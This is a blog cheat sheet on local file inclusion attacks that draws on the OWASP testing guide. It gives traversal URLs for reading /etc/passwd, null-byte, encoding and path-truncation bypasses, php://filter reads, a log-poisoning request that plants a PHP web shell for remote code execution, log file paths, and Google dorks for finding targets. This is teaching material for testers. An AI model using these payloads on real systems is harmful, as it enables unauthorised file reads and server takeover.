---
layout: post
title: "LFI - Local file inclusion"
date: 2023-03-09
description: | 
    Discover concepts of local file inclusion (LFI). Learn the potential consequences of LFI attacks, which can range from information disclosure to remote code execution.
author: Teiiko
categories: [cheatsheet]
tags: ["LFI"]
---

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
<link rel="stylesheet" href="/css/lil-bootstrap.css">
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>



## Introduction
Local File Inclusion (also known as LFI) is the process of including
files, that are already locally present on the server, through the
exploiting of vulnerable inclusion procedures implemented in the
application. This vulnerability occurs, for example, when a page
receives, as input, the path to the file that has to be included and
this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. Although
most examples point to vulnerable PHP scripts, we should keep
in mind that it is also common in other technologies such as JSP,
ASP and others <br>

*(Source: OWASP testing guide)*

## How to test ?

Since LFI occurs when paths passed to "include" statements are
not properly sanitized, in a blackbox testing approach, we should
look for scripts which take filenames as parameters.<br>

Consider the following example:<br>

`http://vulnerable-host/preview.php?file=example.html`

This looks as a perfect place to try for LFI. If an attacker is lucky
enough, and instead of selecting the appropriate page from the array by its name, the script directly includes the input parame-
ter, it is possible to include arbitrary files on the server<br>

`http://vulnerable-host/preview.php?file=../../../../etc/passwd`

If the above mentioned conditions are met, an attacker would
see something like the following:<br>

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
...
```

*(Source: OWASP testing guide)*

## Bypass file extension via null byte

Most of the time, the GET parameter will only take filename in argument. The file extension will be specified in the PHP code, as following:<br>
```php
<?php 
    $file = include($_GET["filename"].".php"); 
?>
```
So, simple substitution with arbitrary filename would not
work as the postfix '.php' is appended. To bypass it, we can add a null-byte behind our requested file. In this case, exploitation would work as following:<br>

`http://vulnerable-host/article.php?=/etc/passwd%00`

## Bypass filters via URL encoding

URL encoding can be very usefull to bypass some filters and special chars in the URL. This exploitation can simply be resumed
by URL encoding your payload. In my case, i often use this site: [URL Encoder](https://www.urlencoder.org/). 
In this exemple, our exploitation would look like this:<br>

`http://vulnerable-host/article.php?=...%2F..%2F..%2F..%2Fetc%2Fpasswd%00`

Know that double URL encoding also works.
## Path truncation (under PHP 5.3)

Path Truncation is an LFI attack technique used to bypass filters that append certain strings to the end of user-provided parameters. For example, appending ".php" to a requested page. Attackers can use directory traversal techniques to access files outside the intended directory. By adding extra dots or slashes to the file path, attackers can confuse the server and bypass certain protections. For example, to access the "/etc/passwd" file on a Linux system, an attacker might use the following URL:

`http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]..`

Alternatively, an attacker might try:

`http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.`

To successfully exploit this technique, the attacker needs to try various combinations of "../" and other characters to determine the right amount needed to delete the appended string while still allowing access to the target file. Starting the path with a fake directory, such as "a/", can help evade detection.
## PHP Wrappers

### php://filter

`php://filter/convert.base64-encode`

Youc can specify a resource wich is the file you want to include. In our exemple, you can do as following:<br>

`http://vulnerable-host/article.php?=php://filter/convert.base64-encode/resource=/etc/passwd`

This will upload a base64-encoded string. By decoding, you'll get the plaintext content of your file.


## From LFI to RCE via log poisoning

A local file inclusion can be escalated to a remote code execution via several ways. A well-known way is via Apache log file poisoning. If the Apache web server is vulnerable to LFI, you can try to access to the log file and set your php payload in your User-Agent. For example, you can set a PHP Web shell as following : `<?php system($_GET['cmd']); ?>`

So the request will looks like this:<br>

```
GET /index.php?page=/var/log/apache2/access.log HTTP/1.1
Host: example.com
User-Agent: <?php system($_GET["cmd"]); ?>
```

In this example, the "page" parameter of the request contains a reference to a local file on the server that is vulnerable to local file inclusion. The User-Agent field contains malicious PHP code that will execute a system command specified by the user via the GET request. If this request is successfully sent, it can allow an attacker to execute arbitrary code on the server, potentially resulting in full system takeover.

Here is a list of common log file path (depending on the web server):<br>
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache2/other_vhosts_access.log
/var/log/apache/access.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/tomcat/access_log
/var/log/tomcat/catalina.out
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/nodejs/node.log
/var/log/syslog
```
## Dorks for LFI - Bug Bounty

 if you are a bug bounty hunter who has been authorized to search for vulnerabilities, Google Dorks can be a valuable tool for finding LFI vulnerabilities. Google Dorks are search queries that can help to identify websites with specific vulnerabilities, including LFI. Here are some examples of Google Dorks for LFI that bug bounty hunters can use:
```
site:example.com inurl:?page=
site:example.com inurl:?file=
site:example.com intitle:"index of"
site:example.com filetype:php inurl:index
```

It is important to note that while Google Dorks can be a useful tool, it should not be the only method of identifying LFI vulnerabilities. Manual testing and other techniques should also be utilized to ensure that all vulnerabilities are identified and addressed appropriately.

## Using ChatGPT for LFI
## Conclusion
<br><br>Thanks for reading ! Give me a feedback on Discord - `Teiiko#8831`

<button id="back-to-top-btn" class="btn btn-primary2 btn-lg circle"><i class="fas fa-arrow-up"></i></button>

<style>
#back-to-top-btn {
  position: fixed;
  bottom: 20px;
  right: 40px;
  display:none;
  cursor:pointer;
}

</style>

<script>
    // Afficher/masquer le bouton "scroll to top"
$(window).scroll(function() {
  if ($(this).scrollTop() > 100) {
    $('#back-to-top-btn').fadeIn();
  } else {
    $('#back-to-top-btn').fadeOut();
  }
});

// Faire remonter au header de la page lorsque le bouton est cliqu√©
$('#back-to-top-btn').click(function() {
  $('html, body').animate({scrollTop : 0},800);
  return false;
});

</script>